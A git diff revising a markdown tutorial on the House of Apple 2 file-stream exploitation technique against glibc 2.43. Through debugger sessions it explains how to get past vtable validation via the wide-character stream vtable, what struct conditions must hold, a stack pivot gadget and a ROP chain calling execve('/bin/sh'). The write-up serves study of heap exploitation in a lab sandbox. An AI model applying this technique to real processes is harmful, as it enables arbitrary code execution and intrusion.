@@ -1,14 +1,16 @@
 # House of Apple 2
 
-**Note**: WIP. This explanation still needs some corrections and improvements.
+File Stream Oriented Programming (FSOP) abuses the vtable dispatch mechanism of `_IO_FILE_plus` structures to hijack control flow. Under the right conditions this gives us an arbitrary call that we can later extend into a stack pivot and a ROP chain.
 
-**FSOP: File Stream Oriented Programming**. The general idea is to abuse the vtable dispatch of `_IO_FILE_plus` structs to achieve arbitrary function calls. This can potentially be escalated into a stack pivoting and ROP. All experiments done in latest glibc at the time of writing (2.43).
+All experiments here use glibc 2.43, available in modern distros such as Ubuntu 26.04 and Fedora Workstation 44.
 
 ## Sandbox environment
 
-The sandbox is an Ubuntu 26.04 (latest LTS) with glibc 2.43, which is the latest glibc shipped in this distro. This is also the same glibc version in latest Fedora 44, so we can say this is a modern exploitation scenario. This sandbox include some tools like gdb, pwndbg, pwntools, ropper, tmux. There is also a target binary that will allow us to control file stream operations like fopen, fread, fwrite, fclose through an interactive menu while we debug and test our hypothesis.
+The sandbox runs Ubuntu 26.04 LTS, giving us a modern environment to explore the technique.
 
-To build and run the sandbox.
+The image includes GDB, pwndbg, pwntools, ropper and tmux. It also contains a target binary with an interactive menu for invoking file stream operations such as `fopen`, `fread`, `fwrite`, and `fclose`. This gives us a convenient way to manipulate streams while debugging and testing ideas.
+
+Build and run the sandbox with:
 
 ```
 ./build.sh
@@ -17,7 +19,7 @@ To build and run the sandbox.
 
 ## Exploration
 
-Let's start by inspecting \_IO_FILE and \_IO_FILE_plus structs.
+Let's start by inspecting the `_IO_FILE` and `_IO_FILE_plus` structures:
 
 ```c
 pwndbg> ptype struct _IO_FILE
@@ -67,16 +69,16 @@ type = struct _IO_FILE_plus {
 
 ```
 
-Practically speaking, \_IO_FILE_plus is an \_IO_FILE with a vtable. A vtable is always an oportunity to hijack the control flow. By controlling the vtable pointer, we can decide where to jump in an indirect function call.
+In practical terms, `_IO_FILE_plus` is an `_IO_FILE` with a vtable pointer. That immediately looks interesting: if we can control this pointer, we may be able to redirect an indirect call and hijack control flow.
 
-Let's explore this vtable by inspecting a FILE pointer returned by fopen.
+To inspect the vtable, let's examine a `FILE` pointer returned by `fopen`.
 
 ```c
 pwndbg> x/a ((struct _IO_FILE_plus *)0x87b8010)->vtable
 0x7f91cc001030 <_IO_file_jumps>:        0x0
 ```
 
-It is targetting \_IO_file_jumps symbol.
+The pointer targets the `_IO_file_jumps` table.
 
 ```c
 pwndbg> tele &_IO_file_jumps 21
@@ -103,9 +105,9 @@ pwndbg> tele &_IO_file_jumps 21
 14:00a0│     0x7f91cc0010d0 (_IO_file_jumps+160) —▸ 0x7f91cbe8ef00 (_IO_default_imbue) ◂— endbr64
 ```
 
-This is a set of 21 function pointers that are dispatched through the vtable on file stream operations depending on the exection flow.
+This is a set of 21 function pointers. File stream operations dispatch through different entries depending on the execution path.
 
-I'll be focusing on `fwrite` flow for this run. Let's place a breakpoint on each of these functions and call fwrite to see what is called first.
+For this exploration I'll focus on the `fwrite` path. After placing breakpoints on each function and calling `fwrite`, the first breakpoint we hit is `_IO_file_xsputn`.
 
 ```c
 b► 0x7f91cbe8b400 <_IO_file_xsputn>       endbr64
@@ -138,7 +140,7 @@ b► 0x7f91cbe8b400 <_IO_file_xsputn>       endbr64
 
 ```
 
-The first one is \_IO_file_xsputn, through fwrite+216. It can be confirmed [here](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/iofwrite.c#L44), as \_IO_sputn is a macro that dispatches to \_IO_file_xsputn through the vtable.
+The call happens at `fwrite+216`. This matches the [glibc source](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/iofwrite.c#L44): `_IO_sputn` is a macro that dispatches through the vtable, resolving to `_IO_file_xsputn` for this stream.
 
 ```asm
    0x00007f91cbe7d62a <+202>:   mov    rdx,rcx
@@ -148,7 +150,7 @@ The first one is \_IO_file_xsputn, through fwrite+216. It can be confirmed [here
    0x00007f91cbe7d638 <+216>:   call   QWORD PTR [rax+0x38]
 ```
 
-Let's try to use this in a new run to overwrite the vtable with `desired_func - 0x38` and breakpoint at fwrite+216.
+For a first attempt, let's overwrite the vtable pointer with `desired_func - 0x38` and set a breakpoint at `fwrite+216`.
 
 ```c
 pwndbg> p &win
@@ -165,7 +167,7 @@ gdb: Program received signal SIGABRT
 Output: Fatal error: glibc detected an invalid stdio handle
 ```
 
-Oops, we didn't even get to the breakpoint. the output message suggests that the base pointer is being validated before the indirect call. We need to inspect this closer to understand what is happening. I wish I had ran this with `record full` to go backwards and inspect. let's inspect the backtrace.
+Oops, execution aborts before reaching the breakpoint. The error suggests that glibc validates the vtable pointer before performing the indirect call. Let's inspect the backtrace and see where this happens.
 
 ```c
 pwndbg> backtrace
@@ -188,7 +190,7 @@ pwndbg> backtrace
 #16 0x0000000000401185 in _start ()
 ```
 
-At some point in fwrite, \_IO_vtable_check is being called and detecting our invalid vtable pointer.
+`fwrite` reaches `_IO_vtable_check` which is rejecting the forged vtable pointer.
 
 ```asm
 pwndbg> disass _IO_vtable_check
@@ -227,16 +229,16 @@ Dump of assembler code for function _IO_vtable_check:
    0x00007f641fca88c5 <+133>:   call   0x7f641fd553a0 <__stack_chk_fail>
 ```
 
-Looks like there's a flag to allow foreign vtables, that is out of our control. Let's better see this from source [here](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/vtables.c#L504).
+The implementation contains a mechanism for accepting foreign vtables, but it is not under our control. The relevant code is available in [`vtables.c`](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/vtables.c#L504).
 
-Wait, I thought this was going to perform the check on whether the vtable pointer is valid or not, but it looks like at this point we're already doomed, except for some very specific cases that are out of our control. I missed the call to `IO_validate_vtable` in the backtrace. Let's inspect this function.
+By the time `_IO_vtable_check` is called, we're already doomed. The earlier `IO_validate_vtable` frame in the backtrace is the interesting part, so let's inspect that instead.
 
 ```c
 pwndbg> disass IO_validate_vtable
 ❌️ No symbol "IO_validate_vtable" in current context.
 ```
 
-Looks like there is no symbol for this function, it might be inlined in fwrite. Actually, [it is](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/libioP.h#L1033).
+GDB cannot resolve `IO_validate_vtable` as a symbol. Looking at the [source](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/libioP.h#L1033), we can see it is inlined into `fwrite`.
 
 ```asm
    0x00007f641fc9d5f6 <+150>:   lea    rdi,[rip+0x1838e3]        # 0x7f641fe20ee0 <__io_vtables>
@@ -250,9 +252,9 @@ Looks like there is no symbol for this function, it might be inlined in fwrite. 
    0x00007f641fc9d620 <+192>:   ja     0x7f641fc9d780 <__GI__IO_fwrite+544>
 ```
 
-Then, a valid pointer should be `[__io_vtables, __io_vtables + IO_VTABLES_LEN]`. This means that we can not use an arbitrary function pointer, but there is a lot of valid space to explore.
+A vtable pointer is accepted only when it falls within `[__io_vtables, __io_vtables + IO_VTABLES_LEN)`. So we cannot simply point it anywhere we want. Still, this is a fairly large region containing several jump tables, which gives us something to explore.
 
-All the valid range
+The valid range begins as follows:
 
 ```
 pwndbg> tele &__io_vtables 0x92f/8
@@ -306,15 +308,15 @@ pwndbg> tele &__io_vtables 0x92f/8
 2f:0178│     0x7f641fe21058 (_IO_file_jumps+40) —▸ 0x7f641fcad2c0 (_IO_default_uflow) ◂— endbr64
 30:0180│     0x7f641fe21060 (_IO_file_jumps+48) —▸ 0x7f641fcaed00 (_IO_default_pbackfail) ◂— endbr64
 ...
-119:08c8│     0x7f641fe217a8 ◂— 0
-... ↓     11 skipped
 ```
 
 ## House of Apple 2
 
-Now we have a good understanding of the mechanism and constraints. There is a well-documented technique to deal with this, House of Apple 2. Let's explore this live in gdb instead of reading it from an inert paper.
+We now understand the basic mechanism and its main constraint: the `_IO_FILE_plus` vtable must point somewhere inside glibc's valid vtable region. This blocks the obvious approach but it does not completely close the door.
 
-There is a `_wide_data` field in our previous `_IO_FILE` structure, which is a pointer to a `_IO_wide_data` structure, and this structure has its own vtable. Let's take a look.
+House of Apple 2 gets around this by reaching a second vtable through the wide-character stream machinery. This second vtable is not validated in the same way. Let's follow that path in GDB and see how the pieces connect.
+
+Back in `_IO_FILE`, there is a `_wide_data` field pointing to an `_IO_wide_data` structure. This structure has a vtable of its own.
 
 ```c
 pwndbg> ptype struct _IO_wide_data
@@ -338,9 +340,9 @@ type = struct _IO_wide_data {
 }
 ```
 
-It is very similar to a FILE structure. This structure is part of the machinery to work with `wchar_t` strings.
+Its layout looks quite similar to `_IO_FILE`. It is part of glibc's machinery for handling wide-character streams.
 
-We need to make our FILE structure use this. There is a known path through [\_IO_wfile_overflow](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/wfileops.c#L407), that will call [\_IO_wdoallocbuf](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/wgenops.c#L364).
+The path we want goes through [`_IO_wfile_overflow`](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/wfileops.c#L407), which can eventually call [`_IO_wdoallocbuf`](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/wgenops.c#L364).
 
 ```c
 wint_t
@@ -389,7 +391,7 @@ _IO_wdoallocbuf (FILE *fp)
 }
 ```
 
-\_IO_WDOALLOCATE is another macro acting on the struct and dispatching an indirect function call through the vtable. The best way to see this is in gdb:
+`_IO_WDOALLOCATE` is another dispatch macro, this time operating through the wide vtable. The indirect call becomes clear in the disassembly:
 
 ```asm
 pwndbg> x/15i _IO_wdoallocbuf
@@ -410,9 +412,9 @@ pwndbg> x/15i _IO_wdoallocbuf
    0x7f7c3a535057 <__GI__IO_wdoallocbuf+55>:    call   QWORD PTR [rax+0x68]
 ```
 
-This is where the magic is happening, on \_IO_wdoallocbuf+44 we are dereferencing the wide_data vtable, and in \_IO_wdoallocbuf+55 we're performing an indirect call to vtable+0x68, no range validation this time.
+Here is the interesting part. At `_IO_wdoallocbuf+44` glibc loads the `_wide_vtable` pointer from `_wide_data`. At `_IO_wdoallocbuf+55` it calls the function pointer at `_wide_vtable + 0x68`. This time there is no range validation.
 
-We were dealing with the vtable of \_IO_FILE_plus a moment ago, and now we jumped to this other struct that contains an insecure indeirect call. Time to connect the dots. The important note is that \_IO_wfile_overflow is part of other jumps table referenced as `_IO_wfile_jumps`, and this table is within the valid range of the initial vtable validation.
+Now the pieces start to connect. `_IO_wfile_overflow` belongs to `_IO_wfile_jumps` which exists inside the valid range accepted by the first vtable check. From there, execution can reach another indirect call through the unvalidated `_wide_vtable`.
 
 ```asm
 pwndbg> tele &_IO_wfile_jumps 21
@@ -444,23 +446,28 @@ pwndbg> p &__io_vtables < &_IO_wfile_jumps < (void *)&__io_vtables+0x92f
 $5 = 0x1
 ```
 
-So, the general idea will be to corrupt the vtable in \_IO_FILE_plus to point to \_IO_wfile_overflow, and reference a \_IO_wide_data struct with a wide_data vtable pointing to `desired_function - 0x68`.
+The general idea is now:
 
-Just a few considerations before trying our next execution, back to the \_IO_wfile_overflow source code, there are some preconditions for this function to take the \_IO_wdoallocbuf path:
+1. Set the `_IO_FILE_plus` vtable so that the relevant slot resolves to `_IO_wfile_overflow`.
+2. Point `_wide_data` to a forged `_IO_wide_data` structure whose `_wide_vtable` is `desired_function - 0x68`.
 
-- \_flags has no \_IO_NO_WRITES (0x0008) flag set
-- wide_data->\_IO_write_base has to be NULL
+Before trying the next run, we need to satisfy a few conditions to reach `_IO_wdoallocbuf`.
 
-Inside \_IO_wdoallocbuf iself:
+In `_IO_wfile_overflow`:
 
-- fp->\_wide_data->\_IO_buf_base has to be NULL
-- \_flags has no \_IO_UNBUFFERED (0x0002) flag set
+- `_flags` must not contain `_IO_NO_WRITES` (`0x0008`)
+- `_wide_data->_IO_write_base` must be `NULL`
 
-Also, there is a `_lock` field in \_IO_FILE. This will be dereferenced for reading and writing to adquire the lock on a multithreading context. We need to make sure this field points to a zero value in a writable memory region.
+In `_IO_wdoallocbuf`:
+
+- `fp->_wide_data->_IO_buf_base` must be `NULL`
+- `_flags` must not contain `_IO_UNBUFFERED` (`0x0002`)
+
+There is one more detail. `_IO_FILE` contains a `_lock` field that glibc dereferences while acquiring and releasing the stream lock. We need to point it to a zero qword value in writable memory, otherwise the stream operation will crash before reaching our call.
 
 ## Control flow hijack
 
-Now we have everything we need to hijack the control flow. Check how the range validation now passes and \_IO_wfile_overflow is executed through the first indirect call.
+Everything is set, let's try again. This time the outer range check passes, and the first indirect call dispatches to `_IO_wfile_overflow`.
 
 ```asm
 b► 0x7fa6fefee5f6 <fwrite+150>    lea    rdi, [rip + 0x1838e3]           RDI => 0x7fa6ff171ee0 (__io_vtables) ◂— 0
@@ -482,7 +489,7 @@ b► 0x7fa6fefee5f6 <fwrite+150>    lea    rdi, [rip + 0x1838e3]           RDI =
 
 ```
 
-All checks on \_IO_wfile_overflow are met to take the \_IO_wdoallocbuf path.
+The forged structure also satisfies the conditions in `_IO_wfile_overflow`. Execution continues into `_IO_wdoallocbuf`.
 
 ```asm
 b► 0x7fa6feff5110 <_IO_wfile_overflow>        endbr64
@@ -508,7 +515,7 @@ b► 0x7fa6feff5110 <_IO_wfile_overflow>        endbr64
 
 ```
 
-And finally, all flag checks and struct fields are correct to perform the arbitrary call in \_IO_wdoallocbuf+55, in this case, to the `win` function.
+Finally, the checks in `_IO_wdoallocbuf` pass, and the indirect call at `_IO_wdoallocbuf+55` lands in our `win` function.
 
 ```asm
 b► 0x7fa6feff3020 <_IO_wdoallocbuf>       endbr64
@@ -528,7 +535,7 @@ b► 0x7fa6feff3020 <_IO_wdoallocbuf>       endbr64
    0x7fa6feff3057 <_IO_wdoallocbuf+55>    call   qword ptr [rax + 0x68]      <win>
 ```
 
-While we are here, just before the last indirect call, notice the state of the registers just before the call.
+While we're here, it is worth looking at the register state immediately before the final indirect call.
 
 ```asm
  RAX  0x183cf088 ◂— 0xffffffffffffffff
@@ -569,15 +576,15 @@ While we are here, just before the last indirect call, notice the state of the r
    0x7fa6feff306a <_IO_wdoallocbuf+74>    mov    rdi, qword ptr [rax + 0x30]
 ```
 
-RDI, RDX are pointing to the first byte of the FILE struct. So, rdi = pointer to memory we control. If the target function dereferences this pointer, we can place the pointed data at offset 0x0 of the file struct and control the first and third argument.
+Both `RDI` and `RDX` point to the beginning of the controlled `FILE` structure. We do not directly control the first and third argument registers, but we control the memory they point to. Cool!
 
-## Synthetizing the primitive
+## Constructing the primitive
 
-This primitive is synthetized in [./exp/house_of_apple2.py](./exp/house_of_apple2.py). A full `_IO_FILE_plus` + a full `_IO_wide_data`, each with its own vtable, would require a large buffer. Instead, in this implementation we overlap both structures and the fake `_wide_data` vtable.
+The primitive is implemented in [`./exp/house_of_apple2.py`](./exp/house_of_apple2.py). A complete `_IO_FILE_plus`, a complete `_IO_wide_data` and a separate fake vtable would require a rather large buffer. This implementation overlaps both structures and the fake `_wide_vtable` to reduce the required space.
 
 ## Stack pivoting
 
-At this point we can perform an arbitrary call with some controls over the registers. The idea at this point is to pivot the stack and escalate into arbitrary code execution using ROP.
+At this point we have achieved arbitrary call, but our control is still limited to a single call. The next step is to pivot the stack into controlled memory and start a ROP chain.
 
 ```asm
 pwndbg> disass __push___start_context
@@ -600,20 +607,24 @@ Dump of assembler code for function __push___start_context:
 End of assembler dump.
 ```
 
-There is this stack-pivoting gadget `mov rsp, rdx` in `__push___start_context+63`. We already know RDX at the time of the arbitrary call, which is a pointer to the beginning of the FILE struct, and we control the content of the struct, so we can cotrol the pointed values. With this, we have everything we need to pivot the stack and start the ROP chain.
+At `__push___start_context+63` there is a useful `mov rsp, rdx; ret` stack pivot gadget. We already know that `RDX` points to the beginning of our controlled `FILE` structure at the time of the arbitrary call. If we call this gadget, `RSP` moves directly into our fake structure and execution continues from the values stored there. That should give us the start of a ROP chain.
 
 ## ROP
 
-There are still some limitations though to this ROP chain, if we remember from previous constrains on the \_IO_wdoallocbuf path. We can't set the \_IO_NO_WRITES flag on the `_flags` field, so the first gadget should have an address that doesnt set the 0x8 bit.
+One catch, the ROP chain overlaps memory with the fake `FILE` structure, so the field constraints from `_IO_wdoallocbuf` still apply. The first qword overlaps `_flags`, which means its value must not set `_IO_NO_WRITES` (`0x8`). Our first gadget therefore needs an address with bit 3 clear in its least significant byte.
 
-This `ret` in `_nl_archive_subfreeres+96` will do the trick. This is not a real instruction of `_nl_archive_subfreeres` but it's a valid mid-instruction gadget, and it happen to be at an address that starts with 0x00, so it won't set the \_IO_NO_WRITES flag when it lands in the `_flags` field of the struct.
+The `ret` gadget at `_nl_archive_subfreeres+96` should do the trick. It is not a `ret` instruction actually present in the original code at that boundary, but it is a valid mid-instruction gadget at that shifted address. Its least significant byte is `0x00`, so placing the address in `_flags` does not set `_IO_NO_WRITES`.
 
 ```asm
 pwndbg> tele 0x7f4672919d00 1
 00:0000│     0x7f4672919d00 (_nl_archive_subfreeres+96) ◂— ret
 ```
 
-Second limitation is that \_IO_write_base has to be null, so we can't place a gadget address there, we can workaround it by popping a 0x0 into a register. Third limitation is that \_IO_buf_base has to be null, we can apply the same approach as in \_IO_write_base. The final limitation is that we can't overwrite the lock field, this is at offset 0x88, so we have 0x88/0x8 = 17 qwords to ROP, that is plenty of space. This the layout of our ROP chain in ace.py:
+We have two more holes in the chain because `_IO_write_base` and `_IO_buf_base` must remain `NULL`. We can still make those slots useful by consuming them as zero values for preceding `pop` gadgets.
+
+Finally, we cannot overwrite `_lock`, located at offset `0x88`. This leaves us with 17 qwords for the inline ROP chain, which is more than enough to achieve full control of the process.
+
+The ROP layout in `ace.py` is:
 
 ```
 0x00: _nl_archive_subfreeres+96 # pointer to ret instruction with least significant byte as 0x00
@@ -624,4 +635,8 @@ Second limitation is that \_IO_write_base has to be null, so we can't place a ga
 0x50: address to execve		# call execve("/bin/sh", NULL)
 ```
 
-At this point we have escalated to arbitrary code execution.
+Now we achieved arbitrary code execution.
+
+## Conclusion
+
+The interesting part of House of Apple 2 is not only the arbitrary-call primitive, but also how several legitimate pieces of glibc fit together: a validated vtable, the wide-character stream machinery, an unvalidated secondary vtable and a controlled FILE structure. Together they allow us to move from an arbitrary call to a stack pivot and finally, to arbitrary code execution through ROP.
